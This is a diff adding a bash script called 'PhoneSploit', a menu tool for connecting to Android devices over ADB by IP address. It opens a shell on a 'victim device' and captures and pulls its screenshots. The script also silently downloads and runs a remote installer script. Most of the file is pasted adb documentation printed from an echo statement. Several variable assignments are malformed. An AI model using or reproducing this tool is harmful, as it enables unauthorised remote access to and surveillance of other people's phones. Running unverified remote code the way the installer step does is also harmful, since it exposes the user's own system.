@@ -1,0 +1,701 @@
+#!/bin/bash
+#
+# This Tool Designed For Lazy Way To Pentest :)
+# Remember Educational Purpose only Not For Crime
+# Im Not Responsible If Something Bad Thing Happen
+# Use At Your Own Risk
+#
+# Coded by : Ghost Hunter | White Hacker
+# More Info : http://www.ypnwhitehacker.blogspot.com
+#
+#
+
+# START
+
+
+#
+RED='\033[0;31m'
+BLACK='\033[0;30m'
+DG='\033[1;31m'
+LIGHT RED='\033[1;31m'
+GR='\033[0;32m'
+LIGHTGREEN='\033[1;32m'
+ORANGE='\033[0;33m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+LIGHT BLUE='\033[1;34m'
+PURPLE='\033[0;35m'
+LIGHT PURPLE='\033[1;35m'
+CYAN='\033[0;36m'
+LIGHT CYAN='\033[0;36m'
+GRAY='\033[0;37m'
+LIGHT GRAY='\033[0;37m'
+RED='\033[0;31m'
+YO='\033[0;33m'
+BLU='\033[0;34m'
+#
+clear
+sh logops.sh
+echo "${RED} Install Requirements"  
+apt update > /dev/null 2>&1 && apt --assume-yes install wget > /dev/null 2>&1 && wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh -q && bash InstallTools.sh  
+                             
+echo "                        ${YO}Let's Make Your Exploitation And Have Fun"
+echo "" 
+echo " ${RED}                       ==[ Note:This Tool Is For Beginner "
+echo "  ${GR}                      ==[ Note:Don't Use This Tool "
+echo "  ${BLU}                      ==[ Note:To Harm Something "
+echo "  ${GRAY}                      ==[ Note:Hack Everything,Harm Nothing"
+echo "  ${GR}                      ==[ Tools Name : PhoneSploit"
+echo "  ${GR}                      ==[ Coded by : Black Wolf"
+echo "   ${RED}                     ==[ Version : 1.0.0"
+echo "  ${GR}                      ==[ Program Type :BASH"
+echo "  ${GR}                      ==[ Gray Wolf Team"
+echo ""
+echo ""
+echo "${GR}Please Select One To Use"
+echo ""
+echo ${GR}  [01] To Connect A Device
+echo "${BG}  [02] To Show Connected Devices"
+echo "${GR}  [03] To Take A Screen Shoot"
+echo "${GR}  [04] Read About ADB"
+echo  "${RED}      [0]  Exit "
+echo  $GR""
+read -p "" act;
+
+if [ $act = 1 ] || [ $act = 01 ]
+then
+clear
+echo " ${GR}After Connect To Victim Device"
+echo "${RED}You Can Do Every Thing Using Terminal Commands"
+echo " ${DG}It Is Base On Your Skill"
+echo "${RED}PLEASE INPUT IP AND PORT"
+echo " EX:ip:port"
+read IP
+adb connect $IP
+adb -s $IP shell
+adb shell
+ls
+
+fi
+
+if [ $act = 2 ] || [ $act = 02 ]
+then
+adb devices -l
+echo "${RED}Enter Device Ip To Exploit"
+read dip
+adb -s $dip shell 
+fi
+
+if [ $act = 3 ] || [ $act = 03 ]
+then
+clear
+cd /sdcard
+echo "${RED}WAIT"
+sleep 5
+mkdir snaped
+echo "${RED}Enter Device Ip To Shoot"
+read sip
+echo "${GR}Enter File Name To Use"
+read fm
+adb connect $sip
+adb shell screencap /sdcard/$fm.png
+adb -s $sip pull /sdcard/$fm.png /sdcard/snaped
+sleep 5
+echo "${RED}Shotfile Have Been Saved To snaped Folder In Your Phone"
+fi
+
+if [ $act = 4 ] || [ $act = 04 ]
+then
+clear
+echo "Android Debug Bridge (adb) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions, such as installing and debugging apps, and it provides access to a Unix shell that you can use to run a variety of commands on a device. It is a client-server program that includes three components:
+
+A client, which sends commands. The client runs on your development machine. You can invoke a client from a command-line terminal by issuing an adb command.
+
+A daemon (adbd), which runs commands on a device. The daemon runs as a background process on each device.
+
+A server, which manages communication between the client and the daemon. The server runs as a background process on your development machine.
+
+adb is included in the Android SDK Platform-Tools package. You can download this package with the SDK Manager, which installs it at android_sdk/platform-tools/. Or if you want the standalone Android SDK Platform-Tools package, you can download it here.
+
+For information on connecting a device for use over ADB, including how to use the Connection Assistant to troubleshoot common problems, see Run apps on a hardware device.
+
+How adb works
+
+When you start an adb client, the client first checks whether there is an adb server process already running. If there isn't, it starts the server process. When the server starts, it binds to local TCP port 5037 and listens for commands sent from adb clients—all adb clients use port 5037 to communicate with the adb server.
+
+The server then sets up connections to all running devices. It locates emulators by scanning odd-numbered ports in the range 5555 to 5585, the range used by the first 16 emulators. Where the server finds an adb daemon (adbd), it sets up a connection to that port. Note that each emulator uses a pair of sequential ports — an even-numbered port for console connections and an odd-numbered port for adb connections. For example:
+
+Emulator 1, console: 5554
+Emulator 1, adb: 5555
+Emulator 2, console: 5556
+Emulator 2, adb: 5557
+and so on...
+
+As shown, the emulator connected to adb on port 5555 is the same as the emulator whose console listens on port 5554.
+
+Once the server has set up connections to all devices, you can use adb commands to access those devices. Because the server manages connections to devices and handles commands from multiple adb clients, you can control any device from any client (or from a script).
+
+Enable adb debugging on your device
+
+To use adb with a device connected over USB, you must enable USB debugging in the device system settings, under Developer options.
+
+On Android 4.2 and higher, the Developer options screen is hidden by default. To make it visible, go to Settings > About phone and tap Build number seven times. Return to the previous screen to find Developer options at the bottom.
+
+On some devices, the Developer options screen might be located or named differently.
+
+You can now connect your device with USB. You can verify that your device is connected by executing adb devices from theandroid_sdk/platform-tools/ directory. If connected, you'll see the device name listed as a "device."
+
+Note: When you connect a device running Android 4.2.2 or higher, the system shows a dialog asking whether to accept an RSA key that allows debugging through this computer. This security mechanism protects user devices because it ensures that USB debugging and other adb commands cannot be executed unless you're able to unlock the device and acknowledge the dialog.
+
+For more information about connecting to a device over USB, read Run Apps on a Hardware Device.
+
+Connect to a device over Wi-Fi
+
+adb usually communicates with the device over USB, but you can also use adb over Wi-Fi after some initial setup over USB, as described below. If you're developing for Wear OS, however, you should instead see the guide to debugging a Wear OS app, which has special instructions for using adb with Wi-Fi and Bluetooth.
+
+Connect your Android device and adb host computer to a common Wi-Fi network accessible to both. Beware that not all access points are suitable; you might need to use an access point whose firewall is configured properly to support adb.
+
+If you are connecting to a Wear OS device, turn off Bluetooth on the phone that's paired with the device.
+
+Connect the device to the host computer with a USB cable.
+
+Set the target device to listen for a TCP/IP connection on port 5555.adb tcpip 5555 
+
+Disconnect the USB cable from the target device.
+
+Find the IP address of the Android device. For example, on a Nexus device, you can find the IP address at Settings > About tablet (or About phone) > Status> IP address. Or, on a Wear OS device, you can find the IP address at Settings >Wi-Fi Settings > Advanced > IP address.
+
+Connect to the device by its IP address.adb connect device_ip_address 
+
+Confirm that your host computer is connected to the target device:$ adb devices List of devices attached device_ip_address:5555 device 
+
+You're now good to go!
+
+If the adb connection is ever lost:
+
+Make sure that your host is still connected to the same Wi-Fi network your Android device is.
+
+Reconnect by executing the adb connect step again.
+
+Or if that doesn't work, reset your adb host:adb kill-server 
+
+Then start over from the beginning.
+
+Query for devices
+
+Before issuing adb commands, it is helpful to know what device instances are connected to the adb server. You can generate a list of attached devices using the devicescommand.
+
+adb devices -l 
+
+In response, adb prints this status information for each device:
+
+Serial number: A string created by adb to uniquely identify the device by its port number. Here's an example serial number: emulator-5554
+
+State: The connection state of the device can be one of the following:
+
+offline: The device is not connected to adb or is not responding.
+
+device: The device is now connected to the adb server. Note that this state does not imply that the Android system is fully booted and operational because the device connects to adb while the system is still booting. However, after boot-up, this is the normal operational state of an device.
+
+no device: There is no device connected.
+
+Description: If you include the -loption, the devices command tells you what the device is. This information is helpful when you have multiple devices connected so that you can tell them apart.
+
+The following example shows the devicescommand and its output. There are three devices running. The first two lines in the list are emulators, and the third line is a hardware device that is attached to the computer.
+
+$ adb devices List of devices attached emulator-5556 device product:sdk_google_phone_x86_64 model:Android_SDK_built_for_x86_64 device:generic_x86_64 emulator-5554 device product:sdk_google_phone_x86 model:Android_SDK_built_for_x86 device:generic_x86 0a388e93 device usb:1-1 product:razor model:Nexus_7 device:flo 
+
+Emulator not listed
+
+The adb devices command has a corner-case command sequence that causes running emulator(s) to not show up in the adb devices output even though the emulator(s) are visible on your desktop. This happens when all of the following conditions are true:
+
+The adb server is not running, and
+
+You use the emulator command with the -port or -ports option with an odd-numbered port value between 5554 and 5584, and
+
+The odd-numbered port you chose is not busy so the port connection can be made at the specified port number, or if it is busy, the emulator switches to another port that meets the requirements in 2, and
+
+You start the adb server after you start the emulator.
+
+One way to avoid this situation is to let the emulator choose its own ports, and don't run more than 16 emulators at once. Another way is to always start the adb server before you use the emulator command, as explained in the following examples.
+
+Example 1: In the following command sequence, the adb devices command starts the adb server, but the list of devices does not appear.
+
+Stop the adb server and enter the following commands in the order shown. For the avd name, provide a valid avd name from your system. To get a list of avd names, type emulator -list-avds. The emulatorcommand is in the android_sdk/toolsdirectory.
+
+$ adb kill-server $ emulator -avd Nexus_6_API_25 -port 5555 $ adb devices List of devices attached * daemon not running. starting it now on port 5037 * * daemon started successfully * 
+
+Example 2: In the following command sequence, adb devices displays the list of devices because the adb server was started first.
+
+To see the emulator in the adb devicesoutput, stop the adb server, and then start it again after using the emulator command and before using the adb devicescommand, as follows:
+
+$ adb kill-server $ emulator -avd Nexus_6_API_25 -port 5557 $ adb start-server $ adb devices List of devices attached emulator-5557 device 
+
+For more information about emulator command-line options, see Using Command Line Parameters.
+
+Send commands to a specific device
+
+If multiple devices are running, you must specify the target device when you issue the adb command. To specify the target, use the devices command to get the serial number of the target. Once you have the serial number, use the -s option with the adb commands to specify the serial number. If you're going to issue a lot of adb commands, you can set the $ANDROID_SERIALenvironment variable to contain the serial number instead. If you use both -s and $ANDROID_SERIAL, -s overrides$ANDROID_SERIAL.
+
+In the following example, the list of attached devices is obtained, and then the serial number of one of the devices is used to install the helloWorld.apk on that device.
+
+$ adb devices List of devices attached emulator-5554 device emulator-5555 device $ adb -s emulator-5555 install helloWorld.apk 
+
+Note: If you issue a command without specifying a target device when multiple devices are available, adb generates an error.
+
+If you have multiple devices available, but only one is an emulator, use the -e option to send commands to the emulator. Likewise, if there are multiple devices but only one hardware device attached, use the -d option to send commands to the hardware device.
+
+Install an app
+
+You can use adb to install an APK on an emulator or connected device with the install command:
+
+adb install path_to_apk 
+
+You must use the -t option with the install command when you install a test APK. For more information, see -t.
+
+For more information about how to create an APK file that you can install on an emulator/device instance, see Build and Run Your App.
+
+Note that, if you are using Android Studio, you do not need to use adb directly to install your app on the emulator/device. Instead, Android Studio handles the packaging and installation of the app for you.
+
+Set up port forwarding
+
+You can use the forward command to set up arbitrary port forwarding, which forwards requests on a specific host port to a different port on a device. The following example sets up forwarding of host port 6100 to device port 7100:
+
+adb forward tcp:6100 tcp:7100 
+
+The following example sets up forwarding of host port 6100 to local:logd:
+
+adb forward tcp:6100 local:logd 
+
+Copy files to/from a device
+
+Use the pull and push commands to copy files to and from an device. Unlike the install command, which only copies an APK file to a specific location, the pull and push commands let you copy arbitrary directories and files to any location in a device.
+
+To copy a file or directory and its sub-directories from the device, do the following:
+
+adb pull remote local 
+
+To copy a file or directory and its sub-directories to the device, do the following:
+
+adb push local remote 
+
+Replace local and remote with the paths to the target files/directory on your development machine (local) and on the device (remote). For example:
+
+adb push foo.txt /sdcard/foo.txt 
+
+Stop the adb server
+
+In some cases, you might need to terminate the adb server process and then restart it to resolve the problem (e.g., if adb does not respond to a command).
+
+To stop the adb server, use the adb kill-server command. You can then restart the server by issuing any other adb command.
+
+Issuing adb commands
+
+You can issue adb commands from a command line on your development machine or from a script. The usage is:
+
+adb [-d | -e | -s serial_number] command 
+
+If there's only one emulator running or only one device connected, the adb command is sent to that device by default. If multiple emulators are running and/or multiple devices are attached, you need to use the -d, -e, or -s option to specify the target device to which the command should be directed.
+
+You can see a detailed list of all supported adb commands using the following command:
+
+adb --help 
+
+Issue shell commands
+
+You can use the shell command to issue device commands through adb, or to start an interactive shell. To issue a single command use the shell command like this:
+
+adb [-d |-e | -s serial_number] shell shell_command 
+
+To start an interactive shell on a device use the shell command like this:
+
+adb [-d | -e | -s serial_number] shell 
+
+To exit an interactive shell, press Control + D or type exit.
+
+Note: With Android Platform-Tools 23and higher, adb handles arguments the same way that the ssh(1) command does. This change has fixed a lot of problems with command injectionand makes it possible to now safely execute commands that contain shellmetacharacters, such as adb install Let\'sGo.apk. But, this change means that the interpretation of any command that contains shell metacharacters has also changed. For example, the adb shell setprop foo 'a b' command is now an error because the single quotes (') are swallowed by the local shell, and the device sees adb shell setprop foo a b. To make the command work, quote twice, once for the local shell and once for the remote shell, the same as you do with ssh(1). For example, adb shell setprop foo "'a b'".
+
+Android provides most of the usual Unix command-line tools. For a list of available tools, use the following command:
+
+adb shell ls /system/bin
+
+Help is available for most of the commands via the --help argument. Many of the shell commands are provided by toybox. General help applicable to all toybox commands is available via toybox --help.
+
+See also Logcat Command-Line Tool which is useful for monitoring the system log.
+
+Call activity manager (am)
+
+Within an adb shell, you can issue commands with the activity manager (am) tool to perform various system actions, such as start an activity, force-stop a process, broadcast an intent, modify the device screen properties, and more. While in a shell, the syntax is:
+
+am command 
+
+You can also issue an activity manager command directly from adb without entering a remote shell. For example:
+
+adb shell am start -a android.intent.action.VIEW 
+
+Table 2. Available activity manager commands
+
+CommandDescriptionstart [options] intentStart an Activity specified byintent.
+
+See the Specification for intent arguments.
+
+Options are:
+
+-D: Enable debugging.
+
+-W: Wait for launch to complete.
+
+--start-profiler file: Start profiler and send results tofile.
+
+-P file: Like --start-profiler, but profiling stops when the app goes idle.
+
+-R count: Repeat the activity launch count times. Prior to each repeat, the top activity will be finished.
+
+-S: Force stop the target app before starting the activity.
+
+--opengl-trace: Enable tracing of OpenGL functions.
+
+--user user_id | current: Specify which user to run as; if not specified, then run as the current user.
+
+startservice [options] intentStart the Service specified byintent.
+
+See the Specification for intent arguments.
+
+Options are:
+
+--user user_id | current: Specify which user to run as; if not specified, then run as the current user.
+
+force-stop packageForce stop everything associated with package (the app's package name).kill [options] packageKill all processes associated with package (the app's package name). This command kills only processes that are safe to kill and that will not impact the user experience.
+
+Options are:
+
+--user user_id | all | current: Specify user whose processes to kill; all users if not specified.
+
+kill-allKill all background processes.broadcast [options] intentIssue a broadcast intent.
+
+See the Specification for intent arguments.
+
+Options are:
+
+[--user user_id | all | current]: Specify which user to send to; if not specified then send to all users.
+
+instrument [options] componentStart monitoring with anInstrumentation instance. Typically the target component is the form test_package/runner_class.
+
+Options are:
+
+-r: Print raw results (otherwise decodereport_key_streamresult). Use with [-e perf true] to generate raw output for performance measurements.
+
+-e name value: Set argument name to value. For test runners a common form is -etestrunner_flagvalue[,value...].
+
+-p file: Write profiling data to file.
+
+-w: Wait for instrumentation to finish before returning. Required for test runners.
+
+--no-window-animation: Turn off window animations while running.
+
+--user user_id | current: Specify which user instrumentation runs in; current user if not specified.
+
+profile start process fileStart profiler on process, write results to file.profile stop processStop profiler on process.dumpheap [options] process fileDump the heap of process, write to file.
+
+Options are:
+
+--user [user_id | current]: When supplying a process name, specify user of process to dump; uses current user if not specified.
+
+-n: Dump native heap instead of managed heap.
+
+set-debug-app [options] packageSet app package to debug.
+
+Options are:
+
+-w: Wait for debugger when app starts.
+
+--persistent: Retain this value.
+
+clear-debug-appClear the package previous set for debugging with set-debug-app.monitor [options]Start monitoring for crashes or ANRs.
+
+Options are:
+
+--gdb: Start gdbserv on the given port at crash/ANR.
+
+screen-compat {on | off}packageControl screen compatibility mode of package.display-size [reset |widthxheight]Override device display size. This command is helpful for testing your app across different screen sizes by mimicking a small screen resolution using a device with a large screen, and vice versa.
+
+Example:
+am display-size 1280x800
+
+display-density dpiOverride device display density. This command is helpful for testing your app across different screen densities on high-density screen environment using a low density screen, and vice versa.
+
+Example:
+am display-density 480
+
+to-uri intentPrint the given intent specification as a URI.
+
+See the Specification for intent arguments.
+
+to-intent-uri intentPrint the given intent specification as an intent: URI.
+
+See the Specification for intent arguments.
+
+Specification for intent arguments
+
+For activity manager commands that take an intent argument, you can specify the intent with the following options:
+
+Show all
+
+Call package manager (pm)
+
+Within an adb shell, you can issue commands with the package manager (pm) tool to perform actions and queries on app packages installed on the device. While in a shell, the syntax is:
+
+pm command 
+
+You can also issue a package manager command directly from adb without entering a remote shell. For example:
+
+adb shell pm uninstall com.example.MyApp 
+
+Table 3. Available package manager commands.
+
+CommandDescriptionlist packages [options] filterPrints all packages, optionally only those whose package name contains the text in filter.
+
+Options:
+
+-f: See their associated file.
+
+-d: Filter to only show disabled packages.
+
+-e: Filter to only show enabled packages.
+
+-s: Filter to only show system packages.
+
+-3: Filter to only show third party packages.
+
+-i: See the installer for the packages.
+
+-u: Also include uninstalled packages.
+
+--user user_id: The user space to query.
+
+list permission-groupsPrints all known permission groups.list permissions [options] groupPrints all known permissions, optionally only those in group.
+
+Options:
+
+-g: Organize by group.
+
+-f: Print all information.
+
+-s: Short summary.
+
+-d: Only list dangerous permissions.
+
+-u: List only the permissions users will see.
+
+list instrumentation [options]List all test packages.
+
+Options:
+
+-f: List the APK file for the test package.
+
+target_package: List test packages for only this app.
+
+list featuresPrints all features of the system.list librariesPrints all the libraries supported by the current device.list usersPrints all users on the system.path packagePrint the path to the APK of the given package.install [options] pathInstalls a package (specified by path) to the system.
+
+Options:
+
+-r: Reinstall an existing app, keeping its data.
+
+-t: Allow test APKs to be installed. Gradle generates a test APK when you have only run or debugged your app or have used the Android Studio Build > Build APK command. If the APK is built using a developer preview SDK (if the targetSdkVersion is a letter instead of a number), you must include the -toption with the installcommand if you are installing a test APK.
+
+-iinstaller_package_name: Specify the installer package name.
+
+-s: Install package on the shared mass storage (such as sdcard).
+
+-f: Install package on the internal system memory.
+
+-d: Allow version code downgrade.
+
+-g: Grant all permissions listed in the app manifest.
+
+uninstall [options] packageRemoves a package from the system.
+
+Options:
+
+-k: Keep the data and cache directories around after package removal.
+
+clear packageDeletes all data associated with a package.enable package_or_componentEnable the given package or component (written as "package/class").disable package_or_componentDisable the given package or component (written as "package/class").disable-user [options] package_or_component
+
+Options:
+
+--user user_id: The user to disable.
+
+grant package_name permissionGrant a permission to an app. On devices running Android 6.0 (API level 23) and higher, the permission can be any permission declared in the app manifest. On devices running Android 5.1 (API level 22) and lower, must be an optional permission defined by the app.revoke package_name permissionRevoke a permission from an app. On devices running Android 6.0 (API level 23) and higher, the permission can be any permission declared in the app manifest. On devices running Android 5.1 (API level 22) and lower, must be an optional permission defined by the app.set-install-location locationChanges the default install location. Location values:
+
+0: Auto: Let system decide the best location.
+
+1: Internal: install on internal device storage.
+
+2: External: on external media.
+
+Note: This is only intended for debugging; using this can cause apps to break and other undesireable behavior.
+
+get-install-locationReturns the current install location. Return values:
+
+0 [auto]: Lets system decide the best location
+
+1 [internal]: Installs on internal device storage
+
+2 [external]: Installs on external media
+
+set-permission-enforced permission [true |false]Specifies whether the given permission should be enforced.trim-caches desired_free_spaceTrim cache files to reach the given free space.create-user user_nameCreate a new user with the given user_name, printing the new user identifier of the user.remove-user user_idRemove the user with the given user_id, deleting all data associated with that userget-max-usersPrints the maximum number of users supported by the device.
+
+Call device policy manager (dpm)
+
+To help you develop and test your device management (or other enterprise) apps, you can issue commands to the device policy manager (dpm) tool. Use the tool to control the active admin app or change a policy's status data on the device. While in a shell, the syntax is:
+
+dpm command 
+
+You can also issue a device policy manager command directly from adb without entering a remote shell:
+
+adb shell dpm command 
+
+Table 4. Available device policy manager commands
+
+CommandDescriptionset-active-admin [options] componentSets component as active admin.
+
+Options are:
+
+--user user_id: Specify the target user. You can also pass --user current to select the current user.
+
+set-profile-owner [options] componentSets component as active admin and its package as profile owner for an existing user.
+
+Options are:
+
+--user user_id: Specify the target user. You can also pass --user current to select the current user.
+
+--name name: Specify the human-readable organization name.
+
+set-device-owner [options] componentSets component as active admin and its package as device owner.
+
+Options are:
+
+--user user_id: Specify the target user. You can also pass --user current to select the current user.
+
+--name name: Specify the human-readable organization name.
+
+remove-active-admin [options] componentDisables an active admin. The app must declareandroid:testOnly in the manifest. This command also removes device and profile owners.
+
+Options are:
+
+--user user_id: Specify the target user. You can also pass --user current to select the current user.
+
+clear-freeze-period-recordClears the device's record of previously-set freeze periods for system OTA updates. This is useful to avoid the device's scheduling restrictions when developing apps that manage freeze-periods. See Manage system updates.
+
+Supported on devices running Android 9.0 (API level 28) and higher.
+
+force-network-logsForces the system to make any existing network logs ready for retrieval by a DPC. If there are connection or DNS logs available, the DPC receives theonNetworkLogsAvailable()callback. See Network activity logging.
+
+This command is rate-limited. Supported on devices running Android 9.0 (API level 28) and higher.
+
+force-security-logsForces the system to make any existing security logs available to the DPC. If there are logs available, the DPC receives theonSecurityLogsAvailable()callback. See Log enterprise device activity.
+
+This command is rate-limited. Supported on devices running Android 9.0 (API level 28) and higher.
+
+Take a screenshot
+
+The screencap command is a shell utility for taking a screenshot of a device display. While in a shell, the syntax is:
+
+screencap filename 
+
+To use the screencap from the command line, type the following:
+
+adb shell screencap /sdcard/screen.png 
+
+Here's an example screenshot session, using the adb shell to capture the screenshot and the pull command to download the file from the device:
+
+$ adb shell shell@ $ screencap /sdcard/screen.png shell@ $ exit $ adb pull /sdcard/screen.png 
+
+Record a video
+
+The screenrecord command is a shell utility for recording the display of devices running Android 4.4 (API level 19) and higher. The utility records screen activity to an MPEG-4 file. You can use this file to create promotional or training videos or for debugging and testing.
+
+In a shell, use the following syntax:
+
+screenrecord [options] filename 
+
+To use screenrecord from the command line, type the following:
+
+adb shell screenrecord /sdcard/demo.mp4 
+
+Stop the screen recording by pressing Control + C (Command + C on Mac); otherwise, the recording stops automatically at three minutes or the time limit set by --time-limit.
+
+To begin recording your device screen, run the screenrecord command to record the video. Then, run the pull command to download the video from the device to the host computer. Here's an example recording session:
+
+$ adb shell shell@ $ screenrecord --verbose /sdcard/demo.mp4 (press Control + C to stop) shell@ $ exit $ adb pull /sdcard/demo.mp4 
+
+The screenrecord utility can record at any supported resolution and bit rate you request, while retaining the aspect ratio of the device display. The utility records at the native display resolution and orientation by default, with a maximum length of three minutes.
+
+Limitations of the screenrecord utility:
+
+Audio is not recorded with the video file.
+
+Video recording is not available for devices running Wear OS.
+
+Some devices might not be able to record at their native display resolution. If you encounter problems with screen recording, try using a lower screen resolution.
+
+Rotation of the screen during recording is not supported. If the screen does rotate during recording, some of the screen is cut off in the recording.
+
+Table 5. screenrecord options
+
+OptionsDescription--helpDisplays command syntax and options--size widthxheightSets the video size: 1280x720. The default value is the device's native display resolution (if supported), 1280x720 if not. For best results, use a size supported by your device's Advanced Video Coding (AVC) encoder.--bit-rate rateSets the video bit rate for the video, in megabits per second. The default value is 4Mbps. You can increase the bit rate to improve video quality, but doing so results in larger movie files. The following example sets the recording bit rate to 6Mbps:screenrecord --bit-rate 6000000 /sdcard/demo.mp4
+
+--time-limit timeSets the maximum recording time, in seconds. The default and maximum value is 180 (3 minutes).--rotateRotates the output 90 degrees. This feature is experimental.--verboseDisplays log information on the command-line screen. If you do not set this option, the utility does not display any information while running.
+
+Read ART profiles for apps
+
+Starting in Android 7.0 (API level 24) the Android Runtime (ART) collects execution profiles for installed apps, which are used to optimize app performance. You might want to examine the collected profiles to understand which methods are determined to be frequently executed and which classes are used during app startup.
+
+To produce a text form of the profile information, use the command:
+
+adb shell cmd package dump-profiles package 
+
+To retrieve the file produced, use:
+
+adb pull /data/misc/profman/package.txt 
+
+Reset test devices
+
+If you test your app across multiple test devices, it may be useful to reset your device between tests, for example, to remove user data and reset the test environment. You can perform a factory reset of a test device running Android 10 (API level 29) or higher using the testharness adb shell command, as shown below.
+
+adb shell cmd testharness enable 
+
+When restoring the device using testharness, the device automatically backs up the RSA key that allows debugging through the current workstation in a persistent location. That is, after the device is reset, the workstation can continue to debug and issue adb commands to the device without manually registering a new key.
+
+Additionally, to help make it easier and more secure to keep testing your app, using thetestharness to restore a device also changes the following device settings:
+
+The device sets up certain system settings so that initial device setup wizards do not appear. That is, the device enters a state from which you can quickly install, debug, and test your app.
+
+Settings:
+
+Disables lock screen
+
+Disables emergency alerts
+
+Disables auto-sync for accounts
+
+Disables automatic system updates
+
+Other:
+
+Disables preinstalled security apps
+
+If you app needs to detect and adapt to the default settings of the testharnesscommand, you can use theActivityManager.isRunningInUserTestHarness().
+
+sqlite
+
+sqlite3 starts the sqlite command-line program for examining sqlite databases. It includes commands such as .dump to print the contents of a table, and .schema to print the SQL CREATE statement for an existing table. You can also execute SQLite commands from the command line, as shown below.
+
+$ adb -s emulator-5554 shell $ sqlite3 /data/data/com.example.app/databases/rssitems.db SQLite version 3.3.12 Enter ".help" for instructions 
+
+For more information, see the sqlite3 command line documentation "
+fi
+if [ $act = 0 ] || [ $act = 0 ]
+then
+exit
+fi
